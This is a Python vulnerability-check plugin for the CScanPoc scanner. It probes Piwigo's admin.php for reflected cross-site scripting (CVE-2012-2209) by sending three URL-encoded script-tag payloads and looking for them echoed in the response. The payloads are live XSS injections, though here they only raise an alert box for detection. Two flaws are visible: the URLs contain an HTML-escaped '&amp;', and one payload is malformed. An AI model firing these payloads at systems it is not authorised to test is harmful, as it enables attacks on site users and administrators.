# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'Piwigo_0005'  # 平台漏洞编号，留空
    name = 'Piwigo多个跨站脚本执行漏洞'  # 漏洞名称
    level = VulnLevel.MED   # 漏洞危害级别
    type = VulnType.XSS  # 漏洞类型
    disclosure_date = '2012-04-23'  # 漏洞公布时间
    desc = '''
        Piwigo是一个基于MySQL5与PHP5开发的相册系统.提供基本的发布和管理照片功能,按多种方式浏览如类别,标签,时间等。
        Piwigo 2.3.4之前版本的admin.php中存在多处跨站脚本执行漏洞。  
    '''  # 漏洞描述
    ref = 'http://www.cnvd.org.cn/flaw/show/CNVD-2012-7650'  # 漏洞来源
    cnvd_id = 'CNVD-2012-7650'  # cnvd漏洞编号
    cve_id = 'CVE-2012-2209'  # cve编号
    product = 'Piwigo'  # 漏洞应用名称
    product_version = '2.3.4之前版本'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '1ad52661-fcb2-46cc-b5ed-dd95647d8296'
    author = '47bwy'  # POC编写者
    create_date = '2018-07-27'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            payloads = {
                '/admin.php?page=configuration&amp;section=%22%3E%3Cscript%3Ealert%28cscan%29;%3C/script%3E',
                '/admin.php?page=languages_new&amp;installstatus=%3Cscript%3Ealert%28cscan29;%3C/script%3E',
                '/admin.php?page=theme&amp;theme=%3Cscript%3Ealert%28cscan%29;%3C/script%3E'
            }
            for payload in payloads:
                url = self.target + payload
                r = requests.get(url)

                if "<script>alert(cscan);</script>" in r.text:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞，漏洞地址为{url}'.format(
                        target=self.target, name=self.vuln.name, url=url))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
